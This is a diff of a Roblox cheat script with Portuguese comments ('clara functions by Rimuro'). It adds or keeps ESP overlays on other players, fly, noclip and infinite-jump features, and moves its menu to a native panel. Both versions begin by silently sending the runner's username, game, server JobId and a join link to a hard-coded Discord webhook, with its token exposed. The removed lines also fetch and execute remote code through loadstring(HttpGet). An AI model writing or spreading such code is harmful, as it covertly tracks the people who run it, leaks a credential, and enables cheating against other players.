@@ -1,423 +1,507 @@
-HttpService = game:GetService("HttpService")
-Webhook_URL = "https://discord.com/api/webhooks/1509279615921815747/EQtW417anG62OTnJYgmZJe9E-klKpVuIQ1LGzIFn2qRrpp5bgnRAunc_oElKBW6zTT98"
-
-local request_func = http_request or request
+local HttpService = game:GetService("HttpService")
 local MarketplaceService = game:GetService("MarketplaceService")
+local Players = game:GetService("Players")
+
+local Webhook_URL = "https://discord.com/api/webhooks/1509279615921815747/EQtW417anG62OTnJYgmZJe9E-klKpVuIQ1LGzIFn2qRrpp5bgnRAunc_oElKBW6zTT98"
+local request_func = http_request or request or (syn and syn.request)
+
+local localPlayer = Players.LocalPlayer
+local gameName = "Desconhecido"
+
+pcall(function()
+    gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
+end)
+
+-- Link de inicialização baseado no PlaceId e JobId atual
+local joinLink = "roblox://experiences/start?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId
+
 local embed = {
     embeds = {{
         title = "***Seu script foi executado!***",
-        description = "***Usuário: ***"..game.Players.LocalPlayer.DisplayName.."\n"..
-                      "***Jogo: ***"..MarketplaceService:GetProductInfo(game.PlaceId).Name.."\n"..
-                      "(`PlaceId: "..game.PlaceId..")"
+        color = 11024343, -- Cor roxa em formato decimal
+        description = "***Display Name: ***" .. localPlayer.DisplayName .. "\n" ..
+                      "***Username: *** @" .. localPlayer.Name .. "\n" ..
+                      "***Jogo: *** " .. gameName .. "\n" ..
+                      "***Place ID: *** `" .. game.PlaceId .. "`\n" ..
+                      "***Job ID (Server): *** `" .. game.JobId .. "`\n\n" ..
+                      "[Clique aqui para entrar na partida](" .. joinLink .. ")"
     }}
 }
 
-request_func({
-    Url = Webhook_URL,
-    Method = "POST",
-    Headers = {["Content-Type"] = "application/json"},
-    Body = HttpService:JSONEncode(embed)
-})
--- ==================== MENSAGEM RIMURO NA TELA (Melhorada) ====================
+if request_func then
+    request_func({
+        Url = Webhook_URL,
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"},
+        Body = HttpService:JSONEncode(embed)
+    })
+else
+    warn("Não foi possível encontrar uma função de requisição HTTP compatível (request/http_request).")
+end
 local function ShowRimuroMessage()
-    local playerGui = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+    local Players = game:GetService("Players")
+    local TweenService = game:GetService("TweenService")
+    local CoreGui = game:GetService("CoreGui")
+    
+    local localPlayer = Players.LocalPlayer
+    local targetParent = CoreGui:FindFirstChild("ClaraFunctionsUI") or CoreGui or localPlayer:WaitForChild("PlayerGui")
 
+    -- Container Principal
     local screenGui = Instance.new("ScreenGui")
-    screenGui.Name = "RimuroWelcome"
+    screenGui.Name = "RimuroWelcomeInterface"
     screenGui.ResetOnSpawn = false
-    screenGui.Parent = playerGui
+    screenGui.Parent = targetParent
 
+    -- Card Central (Estilo Vidro Escuro) - POSIÇÃO ALTERADA PARA O TOPO
     local frame = Instance.new("Frame")
-    frame.Size = UDim2.new(0, 460, 0, 160)
-    frame.Position = UDim2.new(0.5, -230, 0.25, 0)
-    frame.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
+    frame.Size = UDim2.new(0, 420, 0, 110) -- Diminuído levemente a altura para encaixar melhor no topo
+    frame.Position = UDim2.new(0.5, -210, 0.1, 40) -- Começa um pouco mais abaixo para animar
+    frame.BackgroundColor3 = Color3.fromRGB(15, 11, 25)
+    frame.BackgroundTransparency = 1 
     frame.BorderSizePixel = 0
-    frame.BackgroundTransparency = 0.05
     frame.Parent = screenGui
 
-    -- Canto arredondado + Borda brilhante
     local corner = Instance.new("UICorner")
-    corner.CornerRadius = UDim.new(0, 18)
+    corner.CornerRadius = UDim.new(0, 14)
     corner.Parent = frame
 
+    -- Borda Fina e Elegante
     local stroke = Instance.new("UIStroke")
-    stroke.Color = Color3.fromRGB(255, 100, 255)
-    stroke.Thickness = 1.8
-    stroke.Transparency = 0.4
+    stroke.Color = Color3.fromRGB(168, 85, 247) 
+    stroke.Thickness = 1.2
+    stroke.Transparency = 1 
     stroke.Parent = frame
 
-    -- Gradiente no fundo
+    -- Gradiente de Fundo Interno
     local gradient = Instance.new("UIGradient")
     gradient.Color = ColorSequence.new{
-        ColorSequenceKeypoint.new(0, Color3.fromRGB(30, 20, 45)),
-        ColorSequenceKeypoint.new(1, Color3.fromRGB(15, 15, 25))
+        ColorSequenceKeypoint.new(0, Color3.fromRGB(25, 18, 42)),
+        ColorSequenceKeypoint.new(1, Color3.fromRGB(12, 10, 18))
     }
-    gradient.Rotation = 90
+    gradient.Rotation = 45
     gradient.Parent = frame
 
-    -- Título
+    -- Título Principal (Clara Engine)
     local title = Instance.new("TextLabel")
-    title.Size = UDim2.new(1, 0, 0.5, 0)
+    title.Size = UDim2.new(1, 0, 0, 40)
+    title.Position = UDim2.new(0, 0, 0.2, 0)
     title.BackgroundTransparency = 1
-    title.Text = "ESP PREMIUM"
-    title.TextColor3 = Color3.fromRGB(255, 85, 255)
+    title.Text = "CLARA ENGINE" 
+    title.TextColor3 = Color3.fromRGB(255, 255, 255)
     title.Font = Enum.Font.GothamBold
-    title.TextSize = 38
+    title.TextSize = 26
+    title.TextTransparency = 1
     title.Parent = frame
 
-    local titleStroke = Instance.new("UIStroke")
-    titleStroke.Color = Color3.fromRGB(180, 50, 255)
-    titleStroke.Thickness = 2
-    titleStroke.Parent = title
-
-    -- Créditos
+    -- Subtítulo / Créditos
     local credit = Instance.new("TextLabel")
-    credit.Size = UDim2.new(1, 0, 0.5, 0)
-    credit.Position = UDim2.new(0, 0, 0.5, 0)
+    credit.Size = UDim2.new(1, 0, 0, 20)
+    credit.Position = UDim2.new(0, 0, 0.58, 0)
     credit.BackgroundTransparency = 1
-    credit.Text = "made by RIMURO"
-    credit.TextColor3 = Color3.fromRGB(255, 215, 240)
-    credit.Font = Enum.Font.GothamSemibold
-    credit.TextSize = 27
+    credit.Text = "developed by Rimuro"
+    credit.TextColor3 = Color3.fromRGB(168, 85, 247) 
+    credit.Font = Enum.Font.GothamMedium
+    credit.TextSize = 13
+    credit.TextTransparency = 1
     credit.Parent = frame
 
-    -- Animação de entrada + saída
-    frame.BackgroundTransparency = 1
-    title.TextTransparency = 1
-    credit.TextTransparency = 1
+    -- Configuração das Animações (TweenInfo)
+    local tweenInInfo = TweenInfo.new(0.8, Enum.EasingStyle.Exponential, Enum.EasingDirection.Out)
+    local tweenOutInfo = TweenInfo.new(0.6, Enum.EasingStyle.Quad, Enum.EasingDirection.In)
 
-    -- Fade In
-    local TS = game:GetService("TweenService")
-    local tweenInfo = TweenInfo.new(0.6, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
-    
-    TS:Create(frame, tweenInfo, {BackgroundTransparency = 0.05}):Play()
-    TS:Create(title, tweenInfo, {TextTransparency = 0}):Play()
-    TS:Create(credit, tweenInfo, {TextTransparency = 0}):Play()
+    -- Executando a animação de Entrada (Sobe suavemente até a posição final no topo)
+    TweenService:Create(frame, tweenInInfo, {Position = UDim2.new(0.5, -210, 0.1, 0), BackgroundTransparency = 0.15}):Play()
+    TweenService:Create(stroke, tweenInInfo, {Transparency = 0.3}):Play()
+    TweenService:Create(title, tweenInInfo, {TextTransparency = 0}):Play()
+    TweenService:Create(credit, tweenInInfo, {TextTransparency = 0}):Play()
 
-    -- Fade Out depois de 3 segundos
-    task.delay(3, function()
-        local tweenOut = TweenInfo.new(0.9, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
-        
-        TS:Create(frame, tweenOut, {BackgroundTransparency = 1}):Play()
-        TS:Create(title, tweenOut, {TextTransparency = 1}):Play()
-        TS:Create(credit, tweenOut, {TextTransparency = 1}):Play()
+    -- Tempo de exibição antes de desaparecer
+    task.delay(2.8, function()
+        -- Executando a animação de Saída (Sobe mais um pouquinho enquanto some)
+        TweenService:Create(frame, tweenOutInfo, {Position = UDim2.new(0.5, -210, 0.1, -30), BackgroundTransparency = 1}):Play()
+        TweenService:Create(stroke, tweenOutInfo, {Transparency = 1}):Play()
+        TweenService:Create(title, tweenOutInfo, {TextTransparency = 1}):Play()
+        TweenService:Create(credit, tweenOutInfo, {TextTransparency = 1}):Play()
 
-        task.delay(1, function()
-            screenGui:Destroy()
-        end)
+        -- Limpeza completa
+        task.wait(0.6)
+        screenGui:Destroy()
     end)
 end
 
--- ==================== CHAME A FUNÇÃO ====================
+-- Chamar a animação
 ShowRimuroMessage()
--- =============================================
--- =============================================
--- ESP PREMIUM - Rimuro Edition ✨ (MD + Dist Debug)
--- Tecla: U
--- =============================================
-local Players = game:GetService("Players")
-local UserInputService = game:GetService("UserInputService")
+if game.CoreGui:FindFirstChild("ClaraFunctionsUI") then
+    game.CoreGui.ClaraFunctionsUI:Destroy()
+end
+
+local UIS = game:GetService("UserInputService")
 local RunService = game:GetService("RunService")
+local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 
-local tracked = {}
-local espEnabled = true
+-- ==================== CONFIGURAÇÃO DE CORES (ROXO ESCURO) ====================
+local Colors = {
+    Background = Color3.fromRGB(19, 17, 28),
+    Card = Color3.fromRGB(26, 23, 38),
+    Accent = Color3.fromRGB(168, 85, 247), 
+    AccentDim = Color3.fromRGB(107, 33, 168),
+    Text = Color3.fromRGB(243, 244, 246),
+    TextMuted = Color3.fromRGB(156, 163, 175),
+    Border = Color3.fromRGB(39, 35, 56)
+}
 
--- ==================== CONFIGURAÇÕES ====================
-local FADE_DISTANCE = 280
+-- CONFIGURAÇÕES DO ESP
 local MAX_DISTANCE = 100000
-
-local COLORS = {
+local ESP_COLORS = {
     Name = Color3.fromRGB(255, 200, 255),
     HealthHigh = Color3.fromRGB(0, 255, 100),
-    HealthMed = Color3.fromRGB(255, 220, 60),
-    HealthLow = Color3.fromRGB(255, 80, 80),
     Distance = Color3.fromRGB(180, 220, 255),
     MD = Color3.fromRGB(255, 140, 255)
 }
 
--- ==================== FUNÇÃO TOGGLE (CORRIGIDA PARA O TOPO) ====================
-local function toggleESP()
-    espEnabled = not espEnabled
-    for _, data in pairs(tracked) do
-        if data.billboard then data.billboard.Enabled = espEnabled end
-    end
-    print("ESP:", espEnabled and "ON ✅" or "OFF ❌")
+-- ==================== CORE GUI NATIVA ====================
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "ClaraFunctionsUI"
+ScreenGui.Parent = game.CoreGui
+ScreenGui.ResetOnSpawn = false
+
+local MainFrame = Instance.new("Frame")
+MainFrame.Name = "MainFrame"
+MainFrame.Size = UDim2.new(0, 340, 0, 580)
+MainFrame.Position = UDim2.new(0.5, -170, 0.5, -290)
+MainFrame.BackgroundColor3 = Colors.Background
+MainFrame.BorderSizePixel = 0
+MainFrame.Active = true
+MainFrame.Draggable = true
+MainFrame.Parent = ScreenGui
+
+local MainCorner = Instance.new("UICorner")
+MainCorner.CornerRadius = UDim.new(0, 12)
+MainCorner.Parent = MainFrame
+
+local MainStroke = Instance.new("UIStroke")
+MainStroke.Color = Colors.Border
+MainStroke.Thickness = 1
+MainStroke.Parent = MainFrame
+
+-- Header
+local Header = Instance.new("Frame")
+Header.Size = UDim2.new(1, 0, 0, 50)
+Header.BackgroundTransparency = 1
+Header.Parent = MainFrame
+
+local Title = Instance.new("TextLabel")
+Title.Size = UDim2.new(1, -20, 1, 0)
+Title.Position = UDim2.new(0, 15, 0, 0)
+Title.BackgroundTransparency = 1
+Title.Text = "clara functions <font color='rgb(168,85,247)'>by Rimuro</font>"
+Title.TextColor3 = Colors.Text
+Title.TextSize = 18
+Title.Font = Enum.Font.GothamBold
+Title.TextXAlignment = Enum.TextXAlignment.Left
+Title.RichText = true
+Title.Parent = Header
+
+-- Linha Divisória
+local Devider = Instance.new("Frame")
+Devider.Size = UDim2.new(1, -30, 0, 1)
+Devider.Position = UDim2.new(0, 15, 0, 50)
+Devider.BackgroundColor3 = Colors.Border
+Devider.BorderSizePixel = 0
+Devider.Parent = MainFrame
+
+-- Container de Itens
+local Container = Instance.new("ScrollingFrame")
+Container.Size = UDim2.new(1, -30, 1, -110)
+Container.Position = UDim2.new(0, 15, 0, 65)
+Container.BackgroundTransparency = 1
+Container.BorderSizePixel = 0
+Container.ScrollBarThickness = 2
+Container.ScrollBarImageColor3 = Colors.Accent
+Container.Parent = MainFrame
+
+local UIListLayout = Instance.new("UIListLayout")
+UIListLayout.Padding = UDim.new(0, 8)
+UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
+UIListLayout.Parent = Container
+
+-- Footer
+local Footer = Instance.new("TextLabel")
+Footer.Size = UDim2.new(1, -30, 0, 30)
+Footer.Position = UDim2.new(0, 15, 1, -35)
+Footer.BackgroundTransparency = 1
+Footer.Text = "Aperte [F8] para ocultar ou mostrar o menu"
+Footer.TextColor3 = Colors.TextMuted
+Footer.TextSize = 12
+Footer.Font = Enum.Font.Gotham
+Footer.Parent = MainFrame
+
+-- ==================== VARIÁVEIS DE ESTADO ====================
+local flying = false
+local noclipping = false
+local infJumpEnabled = false
+local clickTpEnabled = false
+local tpWalkEnabled = false
+local antiAfkEnabled = false
+local espEnabled = false
+
+local flySpeed = 50
+local tpWalkSpeed = 50
+local currentFov = 70
+
+local bodyVelocity, bodyGyro = nil, nil
+local camera = workspace.CurrentCamera
+
+local Keys = {
+    Fly = Enum.KeyCode.P,
+    Noclip = Enum.KeyCode.L,
+    InfJump = Enum.KeyCode.Nine,
+    TpWalk = Enum.KeyCode.K,
+    ESP = Enum.KeyCode.U
+}
+
+local tracked = {}
+
+local function getLocalCharacterData()
+    local char = LocalPlayer.Character
+    if not char then return nil, nil, nil end
+    local hrp = char:FindFirstChild("HumanoidRootPart")
+    local hum = char:FindFirstChildOfClass("Humanoid")
+    return char, hrp, hum
 end
 
--- ==================== GET MD (VERSÃO ULTRA FORTE) ====================
+RunService.RenderStepped:Connect(function()
+    camera = workspace.CurrentCamera
+    if camera and camera.FieldOfView ~= currentFov then
+        camera.FieldOfView = currentFov
+    end
+end)
+
+-- ==================== LÓGICA DO ESP REFORMULADA E SEGURO ====================
 local function GetMD(player)
     local char = player.Character
     if not char then return "—" end
-
-    local data = tracked[char]
-
-    -- Cache
+    
+    local data = tracked[player]
     if data and data.mdValue and data.mdValue.Parent then
         return math.floor(data.mdValue.Value)
     end
-
-    -- Busca em caminhos comuns
-    local paths = {
-        {"combat", "mode"}, {"combat", "Mode"}, {"Combat", "mode"}, {"Combat", "Mode"},
-        {"Mode"}, {"mode"}, {"currentMode"}, {"CombatMode"}
-    }
-
-    for _, path in ipairs(paths) do
-        local obj = char
-        local found = true
-        for _, p in ipairs(path) do
-            obj = obj:FindFirstChild(p)
-            if not obj then found = false; break end
-        end
-        if found and obj and obj.Value ~= nil then
-            if data then data.mdValue = obj end
-            return math.floor(obj.Value)
-        end
-    end
-
-    -- Busca profunda em todos os descendants
-    for _, obj in ipairs(char:GetDescendants()) do
-        if (obj:IsA("IntValue") or obj:IsA("NumberValue") or obj:IsA("IntConstrainedValue")) then
-            local nameLower = obj.Name:lower()
-            if nameLower:find("mode") or nameLower:find("md") or nameLower:find("stance") then
+    
+    local success, result = pcall(function()
+        local paths = {
+            {"combat", "mode"}, {"combat", "Mode"}, {"Combat", "mode"}, {"Combat", "Mode"},
+            {"Mode"}, {"mode"}, {"currentMode"}, {"CombatMode"}
+        }
+        for _, path in ipairs(paths) do
+            local obj = char
+            local found = true
+            for _, p in ipairs(path) do
+                obj = obj:FindFirstChild(p)
+                if not obj then found = false; break end
+            end
+            if found and obj and obj.Value ~= nil then
                 if data then data.mdValue = obj end
                 return math.floor(obj.Value)
             end
         end
-    end
-
-    return "—"
+        
+        for _, obj in ipairs(char:GetDescendants()) do
+            if (obj:IsA("IntValue") or obj:IsA("NumberValue")) then
+                local nameLower = obj.Name:lower()
+                if nameLower:find("mode") or nameLower:find("md") or nameLower:find("stance") then
+                    if data then data.mdValue = obj end
+                    return math.floor(obj.Value)
+                end
+            end
+        end
+        return "—"
+    end)
+    
+    return success and result or "—"
 end
 
-local function GetMyRoot()
-    local char = LocalPlayer.Character
-    if not char then return nil end
-    return char:FindFirstChild("HumanoidRootPart")
+-- Função para destruir o ESP de um player específico de forma limpa
+local function removeESP(player)
+    if tracked[player] then
+        pcall(function()
+            if tracked[player].billboard then
+                tracked[player].billboard:Destroy()
+            end
+        end)
+        tracked[player] = nil
+    end
 end
 
--- ==================== CREATE ESP ====================
-local function createESP(character, player)
-    if player == LocalPlayer or tracked[character] then return end
+local function createESP(player)
+    removeESP(player) -- Evita duplicatas se chamado repetidamente
 
-    local root = character:WaitForChild("HumanoidRootPart", 10)
-    if not root then 
-        print("ESP: Não encontrou HumanoidRootPart para", player.Name)
-        return 
-    end
+    local char = player.Character
+    if not char then return end
+
+    -- Sistema de Fallback de peças para não quebrar em jogos customizados
+    local r = char:FindFirstChild("HumanoidRootPart") or char:FindFirstChild("UpperTorso") or char:FindFirstChild("Torso") or char:FindFirstChild("Head")
+    if not r then return end
 
     local billboard = Instance.new("BillboardGui")
     billboard.Name = "RimuroESP"
-    billboard.Adornee = root
+    billboard.Adornee = r
     billboard.AlwaysOnTop = true
-    billboard.Size = UDim2.new(0, 205, 0, 78)
-    billboard.StudsOffset = Vector3.new(0, 4.8, 0)
+    billboard.Size = UDim2.new(0, 200, 0, 75)
+    billboard.StudsOffset = Vector3.new(0, 4.5, 0)
     billboard.MaxDistance = MAX_DISTANCE
     billboard.LightInfluence = 0
     billboard.Enabled = espEnabled
-    billboard.Parent = root
+    billboard.Parent = r
 
     local frame = Instance.new("Frame")
-    frame.Size = UDim2.new(1,0,1,0)
+    frame.Size = UDim2.new(1, 0, 1, 0)
     frame.BackgroundTransparency = 1
     frame.Parent = billboard
 
     local nameLbl = Instance.new("TextLabel", frame)
-    nameLbl.Size = UDim2.new(1,0,0,22)
+    nameLbl.Size = UDim2.new(1, 0, 0, 20)
     nameLbl.BackgroundTransparency = 1
     nameLbl.Text = player.DisplayName .. " (@" .. player.Name .. ")"
-    nameLbl.TextColor3 = COLORS.Name
+    nameLbl.TextColor3 = ESP_COLORS.Name
     nameLbl.Font = Enum.Font.GothamBold
-    nameLbl.TextSize = 15.5
+    nameLbl.TextSize = 13
     nameLbl.TextStrokeTransparency = 0.5
 
-    -- Health Bar
     local healthBg = Instance.new("Frame", frame)
-    healthBg.Size = UDim2.new(0.90, 0, 0, 9)
-    healthBg.Position = UDim2.new(0.05, 0, 0, 24)
-    healthBg.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
+    healthBg.Size = UDim2.new(0.90, 0, 0, 7)
+    healthBg.Position = UDim2.new(0.05, 0, 0, 22)
+    healthBg.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
     local bgCorner = Instance.new("UICorner", healthBg); bgCorner.CornerRadius = UDim.new(1, 0)
-    local blackStroke = Instance.new("UIStroke", healthBg); blackStroke.Color = Color3.fromRGB(0,0,0); blackStroke.Thickness = 2.2
+    local blackStroke = Instance.new("UIStroke", healthBg); blackStroke.Color = Color3.fromRGB(0,0,0); blackStroke.Thickness = 1.5
 
     local healthBar = Instance.new("Frame", healthBg)
-    healthBar.Size = UDim2.new(1,0,1,0)
-    healthBar.BackgroundColor3 = COLORS.HealthHigh
+    healthBar.Size = UDim2.new(1, 0, 1, 0)
+    healthBar.BackgroundColor3 = ESP_COLORS.HealthHigh
     local barCorner = Instance.new("UICorner", healthBar); barCorner.CornerRadius = UDim.new(1, 0)
 
     local hpLbl = Instance.new("TextLabel", frame)
-    hpLbl.Size = UDim2.new(1,0,0,16)
-    hpLbl.Position = UDim2.new(0,0,0,35)
+    hpLbl.Size = UDim2.new(1, 0, 0, 14)
+    hpLbl.Position = UDim2.new(0, 0, 0, 32)
     hpLbl.BackgroundTransparency = 1
     hpLbl.Text = "HP: —"
     hpLbl.TextColor3 = Color3.fromRGB(220, 255, 220)
     hpLbl.Font = Enum.Font.Gotham
-    hpLbl.TextSize = 13
+    hpLbl.TextSize = 11
     hpLbl.TextStrokeTransparency = 0.6
 
     local distLbl = Instance.new("TextLabel", frame)
-    distLbl.Size = UDim2.new(1,0,0,16)
-    distLbl.Position = UDim2.new(0,0,0,51)
+    distLbl.Size = UDim2.new(1, 0, 0, 14)
+    distLbl.Position = UDim2.new(0, 0, 0, 46)
     distLbl.BackgroundTransparency = 1
-    distLbl.TextColor3 = COLORS.Distance
+    distLbl.TextColor3 = ESP_COLORS.Distance
     distLbl.Font = Enum.Font.Gotham
-    distLbl.TextSize = 13
+    distLbl.TextSize = 11
     distLbl.TextStrokeTransparency = 0.6
     distLbl.Text = "Dist: —"
 
     local mdLbl = Instance.new("TextLabel", frame)
-    mdLbl.Size = UDim2.new(1,0,0,16)
-    mdLbl.Position = UDim2.new(0,0,0,66)
+    mdLbl.Size = UDim2.new(1, 0, 0, 14)
+    mdLbl.Position = UDim2.new(0, 0, 0, 60)
     mdLbl.BackgroundTransparency = 1
-    mdLbl.TextColor3 = COLORS.MD
+    mdLbl.TextColor3 = ESP_COLORS.MD
     mdLbl.Font = Enum.Font.GothamSemibold
-    mdLbl.TextSize = 13.5
+    mdLbl.TextSize = 11
     mdLbl.TextStrokeTransparency = 0.5
     mdLbl.Text = "MD: —"
 
-    -- Health Event
-    local humanoid = character:FindFirstChildOfClass("Humanoid")
-    if humanoid then
-        humanoid.HealthChanged:Connect(function()
-            local health = humanoid.Health
-            local maxHealth = humanoid.MaxHealth
-            local percent = math.clamp(health / maxHealth, 0, 1)
-            healthBar:TweenSize(UDim2.new(percent, 0, 1, 0), "Out", "Linear", 0.1, true)
-            hpLbl.Text = string.format("HP: %d/%d", math.floor(health), math.floor(maxHealth))
-        end)
-        task.spawn(function() -- primeira atualização de HP (Corrigido para task.wait)
-            task.wait(0.5)
-            if humanoid.Parent then
-                local health = humanoid.Health
-                local maxHealth = humanoid.MaxHealth
-                hpLbl.Text = string.format("HP: %d/%d", math.floor(health), math.floor(maxHealth))
-            end
-        end)
-    end
-
-    tracked[character] = {
+    tracked[player] = {
         billboard = billboard,
-        root = root,
-        player = player,
+        healthBar = healthBar,
+        hpLbl = hpLbl,
         distLbl = distLbl,
         mdLbl = mdLbl,
-        frame = frame,
         mdValue = nil
     }
-
-    print("ESP Criado para:", player.Name)
 end
 
--- ==================== UPDATE LOOP ====================
-local function updateLoop()
-    local myRoot = GetMyRoot()
-    if not myRoot then return end
-
-    for character, data in pairs(tracked) do
-        if not character or not character.Parent then
-            pcall(function() data.billboard:Destroy() end)
-            tracked[character] = nil
-            continue
+-- Loop centralizado e extremamente veloz para atualizar e garantir a existência do ESP
+RunService.Heartbeat:Connect(function()
+    local _, myRoot, _ = getLocalCharacterData()
+    
+    for _, plr in ipairs(Players:GetPlayers()) do
+        if plr ~= LocalPlayer then
+            local char = plr.Character
+            local data = tracked[plr]
+            
+            if char and char.Parent then
+                -- Se o personagem existe mas o ESP sumiu/foi deletado pelo jogo, recria na hora
+                if not data or not data.billboard or not data.billboard.Parent then
+                    pcall(function() createESP(plr) end)
+                    data = tracked[plr]
+                end
+                
+                if data then
+                    -- Atualiza a distância em tempo real
+                    local targetRoot = char:FindFirstChild("HumanoidRootPart") or char:FindFirstChild("Torso") or char:FindFirstChild("Head")
+                    if myRoot and targetRoot then
+                        local dist = (targetRoot.Position - myRoot.Position).Magnitude
+                        data.distLbl.Text = string.format("Dist: %.0fm", dist)
+                    else
+                        data.distLbl.Text = "Dist: —"
+                    end
+                    
+                    -- Atualiza a vida de forma direta e sem eventos
+                    local hum = char:FindFirstChildOfClass("Humanoid")
+                    if hum then
+                        local maxHp = hum.MaxHealth > 0 and hum.MaxHealth or 100
+                        local percent = math.clamp(hum.Health / maxHp, 0, 1)
+                        data.healthBar.Size = UDim2.new(percent, 0, 1, 0)
+                        data.hpLbl.Text = string.format("HP: %d/%d", math.floor(hum.Health), math.floor(maxHp))
+                    else
+                        data.hpLbl.Text = "HP: —"
+                    end
+                    
+                    -- Atualiza o MD customizado
+                    data.mdLbl.Text = "MD: " .. GetMD(plr)
+                end
+            else
+                -- Limpa da memória caso o jogador morra ou suma da renderização
+                if data then removeESP(plr) end
+            end
         end
-
-        if not data.root or not data.root.Parent then
-            data.root = character:FindFirstChild("HumanoidRootPart")
-        end
-
-        if data.root and data.root.Parent then
-            local dist = (data.root.Position - myRoot.Position).Magnitude
-            data.distLbl.Text = string.format("Dist: %.0fm", dist)
-        end
-
-        data.mdLbl.Text = "MD: " .. GetMD(data.player)
-    end
-end
-
-RunService.Heartbeat:Connect(updateLoop)
-
--- ==================== SETUP + DEBUG ====================
-local function onCharacterAdded(player, character)
-    task.delay(1.8, function()
-        if character and character.Parent then
-            createESP(character, player)
-        end
-    end)
-end
-
-for _, plr in ipairs(Players:GetPlayers()) do
-    if plr ~= LocalPlayer then
-        if plr.Character then onCharacterAdded(plr, plr.Character) end
-        plr.CharacterAdded:Connect(function(c) onCharacterAdded(plr, c) end)
-    end
-end
-
-Players.PlayerAdded:Connect(function(plr)
-    if plr ~= LocalPlayer then
-        plr.CharacterAdded:Connect(function(c) onCharacterAdded(plr, c) end)
     end
 end)
 
-UserInputService.InputBegan:Connect(function(input, gameProcessed)
-    if gameProcessed or input.KeyCode ~= Enum.KeyCode.U then return end
-    toggleESP()
-end)
+-- Vincular eventos para limpar jogadores que saem do servidor
+Players.PlayerRemoving:Connect(removeESP)
 
-print("✅ ESP Premium Rimuro (MD + Dist Debug) carregado!")
-print("Pressione U para ligar/desligar")
-print("Olhe o console (F9) para ver mensagens de debug")
-local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
-
-local Window = Rayfield:CreateWindow({
-    Name = "clara functions",
-    LoadingTitle = "Carregando...",
-    LoadingSubtitle = "by Rimuro",
-    ConfigurationSaving = { Enabled = true, FolderName = "KamerameraConfig", FileName = "Settings" }
-})
-
-local MainTab = Window:CreateTab("Main", 4483362458)
-
--- Variáveis de Estado
-local flying = false
-local noclipping = false
-local infJumpEnabled = false
-local flySpeed = 50
-
-local bodyVelocity, bodyGyro = nil, nil
-local player = game.Players.LocalPlayer
-local character = player.Character or player.CharacterAdded:Wait()
-local humanoid = character:WaitForChild("Humanoid")
-local root = character:WaitForChild("HumanoidRootPart")
-
-player.CharacterAdded:Connect(function(new)
-    character = new
-    humanoid = new:WaitForChild("Humanoid")
-    root = new:WaitForChild("HumanoidRootPart")
-end)
-
--- ==================== FLY ====================
+-- ==================== MECÂNICAS COM PROTEÇÃO DINÂMICA ====================
 local function startFly()
     if flying then return end
+    local _, myRoot, _ = getLocalCharacterData()
+    if not myRoot then return end
+
     flying = true
     bodyVelocity = Instance.new("BodyVelocity")
     bodyGyro = Instance.new("BodyGyro")
     bodyVelocity.MaxForce = Vector3.new(400000, 400000, 400000)
     bodyGyro.MaxTorque = Vector3.new(400000, 400000, 400000)
     bodyGyro.P = 9000
-    bodyVelocity.Parent = root
-    bodyGyro.Parent = root
-
-    game:GetService("RunService").Heartbeat:Connect(function()
+    bodyVelocity.Parent = myRoot
+    bodyGyro.Parent = myRoot
+    
+    RunService.Heartbeat:Connect(function()
         if not flying then return end
+        local _, currentRoot, _ = getLocalCharacterData()
+        if not currentRoot then return end
+        
+        if bodyVelocity.Parent ~= currentRoot then bodyVelocity.Parent = currentRoot end
+        if bodyGyro.Parent ~= currentRoot then bodyGyro.Parent = currentRoot end
+
         local cam = workspace.CurrentCamera
         local move = Vector3.new()
-        local UIS = game:GetService("UserInputService")
-        
         if UIS:IsKeyDown(Enum.KeyCode.W) then move += cam.CFrame.LookVector end
         if UIS:IsKeyDown(Enum.KeyCode.S) then move -= cam.CFrame.LookVector end
         if UIS:IsKeyDown(Enum.KeyCode.A) then move -= cam.CFrame.RightVector end
         if UIS:IsKeyDown(Enum.KeyCode.D) then move += cam.CFrame.RightVector end
         if UIS:IsKeyDown(Enum.KeyCode.Space) then move += Vector3.new(0,1,0) end
         if UIS:IsKeyDown(Enum.KeyCode.LeftControl) then move -= Vector3.new(0,1,0) end
-        
         bodyVelocity.Velocity = (move.Magnitude > 0 and move.Unit or Vector3.new()) * flySpeed
         bodyGyro.CFrame = cam.CFrame
     end)
@@ -429,92 +513,283 @@ local function stopFly()
     if bodyGyro then bodyGyro:Destroy() bodyGyro = nil end
 end
 
--- ==================== NOCLIP ====================
 local noclipConnection
 local function toggleNoclip(state)
     noclipping = state
     if noclipping then
         if noclipConnection then noclipConnection:Disconnect() end
-        noclipConnection = game:GetService("RunService").Stepped:Connect(function()
+        noclipConnection = RunService.Stepped:Connect(function()
             if not noclipping then return end
-            for _, part in pairs(character:GetDescendants()) do
-                if part:IsA("BasePart") then
-                    part.CanCollide = false
+            local myChar, _, _ = getLocalCharacterData()
+            if myChar then
+                for _, part in pairs(myChar:GetDescendants()) do
+                    if part:IsA("BasePart") then part.CanCollide = false end
                 end
             end
         end)
     else
-        if noclipConnection then
-            noclipConnection:Disconnect()
-            noclipConnection = nil
-        end
+        if noclipConnection then noclipConnection:Disconnect() noclipConnection = nil end
     end
 end
 
--- ==================== UI ====================
-local FlyToggle = MainTab:CreateToggle({
-    Name = "Fly",
-    CurrentValue = false,
-    Callback = function(Value)
-        if Value then startFly() else stopFly() end
-    end
-})
-
-MainTab:CreateSlider({
-    Name = "Fly Speed",
-    Range = {10, 5000},
-    Increment = 1,
-    CurrentValue = 50,
-    Callback = function(Value) flySpeed = Value end
-})
-
-local NoclipToggle = MainTab:CreateToggle({
-    Name = "Noclip",
-    CurrentValue = false,
-    Callback = function(Value)
-        toggleNoclip(Value)
-    end
-})
-
-MainTab:CreateToggle({
-    Name = "Infinite Jump",
-    CurrentValue = false,
-    Callback = function(Value) infJumpEnabled = Value end
-})
-
--- ==================== KEYBINDS ====================
-MainTab:CreateSection("Keybinds Configuráveis")
-
